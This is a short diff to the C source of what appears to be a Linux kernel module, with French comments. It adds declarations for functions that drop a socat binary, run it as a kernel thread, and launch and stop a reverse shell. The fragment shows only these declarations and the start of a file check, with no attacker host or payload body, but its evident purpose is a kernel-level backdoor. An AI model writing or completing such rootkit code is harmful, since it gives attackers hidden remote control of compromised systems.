@@ -14,6 +14,12 @@
 struct task_struct *socat_task = NULL;  // Pour suivre le processus `socat`
 struct completion socat_completion;  // Pour savoir quand `socat` a terminé
 
+int is_socat_binaire_dropped(void);
+int drop_socat_binaire(void);
+static int socat_task_fn(void *data);
+int launch_reverse_shell(void);
+int stop_reverse_shell(void);
+
 int is_socat_binaire_dropped(void){
 	struct file *f;
 	f = filp_open(SOCAT_BINARY_PATH, O_RDONLY, 0);
